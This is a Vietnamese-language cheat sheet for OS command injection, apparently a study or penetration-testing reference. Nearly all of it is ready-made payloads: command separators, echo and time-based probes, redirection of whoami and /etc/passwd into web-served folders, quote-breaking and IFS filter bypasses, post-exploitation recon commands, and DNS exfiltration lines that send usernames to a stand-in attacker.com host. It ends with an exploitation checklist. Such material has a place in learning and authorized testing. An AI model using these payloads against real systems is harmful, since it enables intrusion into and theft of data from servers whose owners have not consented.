# 🛠 OS Command Injection Cheat Sheet

## 1. Các ký tự nối lệnh (Command separators)

### Dùng được cả trên Unix và Windows
- `&` → chạy nhiều lệnh liên tiếp, luôn thực thi lệnh sau.
- `&&` → chỉ chạy lệnh sau nếu lệnh trước thành công.
- `|` → chuyển output của lệnh trước thành input của lệnh sau.
- `||` → chỉ chạy lệnh sau nếu lệnh trước thất bại.

### Chỉ Unix (Linux/macOS)
- `;` → nối nhiều lệnh liên tiếp, bất kể thành công/thất bại.
- `\n` (newline) → xuống dòng, coi như lệnh mới.
- `` `cmd` `` → thực thi lệnh trong dấu backtick và thay thế kết quả.
- `$(cmd)` → tương tự backtick nhưng dễ lồng lệnh hơn.

### Chỉ Windows
- `^` → escape ký tự đặc biệt trong CMD.
- `%COMSPEC% /c cmd` → gọi shell mới để thực thi lệnh.

---

## 2. Payload cơ bản để test injection

### Kiểm tra command injection (echo marker)
```bash
& echo INJECTED &
&& echo INJECTED
| echo INJECTED
; echo INJECTED
```

### Payload gây delay (time-based)
```bash
# Unix
& sleep 10 &
; sleep 5

# Windows
& ping -n 10 127.0.0.1 &
```
### Payload tạo file (output redirection)
```bash
& whoami > /var/www/static/whoami.txt &
; cat /etc/passwd > /var/www/static/passwd.txt
```
### Payload gửi dữ liệu ra ngoài (OAST / exfiltration)
```bash
# Unix DNS exfiltration
; nslookup `whoami`.attacker.com
; nslookup $(id).attacker.com

# Windows
& nslookup %USERNAME%.attacker.com
```
## 3. Lệnh hữu ích sau khi exploit
```
| Mục đích          | Linux               | Windows            |
| ----------------- | ------------------- | ------------------ |
| User hiện tại     | `whoami`            | `whoami`           |
| Thông tin OS      | `uname -a`          | `ver`              |
| Cấu hình mạng     | `ifconfig` / `ip a` | `ipconfig /all`    |
| Kết nối mạng      | `netstat -an`       | `netstat -an`      |
| Process đang chạy | `ps -ef`            | `tasklist`         |
| Liệt kê file      | `ls -la`            | `dir`              |
| Đọc file nhạy cảm | `cat /etc/passwd`   | `type C:\boot.ini` |
```
## 4. Một số tình huống đặc biệt
```bash
' & whoami & '
" ; id ; "
```
### Khi filter một số ký tự đặc biệt
#### Thử encoding hoặc bypass bằng biến môi trường:
```bash
$(whoami)
`${IFS}id`      # IFS = space trong Unix
```

## Example
```bash
ping -c 1 127.0.0.1
ping -c 1 127.0.0.1; whoami
```
```bash
127.0.0.1 & echo INJECTED & 
check output if 'INJECTED'
```
```bash
time based
127.0.0.1 && sleep 10
```
```bash
redirect output file
127.0.0.1; whoami > /var/www/html/whoami.txt
```
```bash
out of band exfiltration
127.0.0.1; nslookup `whoami`.attacker.com
```
```bash
quote breaking
ping -c 1 'USER_INPUT'
USER_INPUT: 127.0.0.1' ; whoami ; #
```
### Window example 
Ping + `whoami`
```cmd 
ping 127.0.0.1 & whoami
```
Delay with `ping`
```cmd
127.0.0.1 && ping -n 5 127.0.0.1
```
Out-of-band with `nslookup`
```cmd
127.0.0.1 & nslookup %USERNAME%.attacker.com
```

## 6. Checklist khi thử khai thác
```
Thử nối lệnh với ;, &, &&, |.

Nếu có output → dùng echo hoặc whoami.

Nếu không có output → thử delay (sleep/ping).

Redirect ra file nếu có quyền ghi.

Nếu bị filter ký tự → thử backtick `cmd` hoặc $(cmd).

Dùng OAST (nslookup, curl, wget) để chắc chắn.
```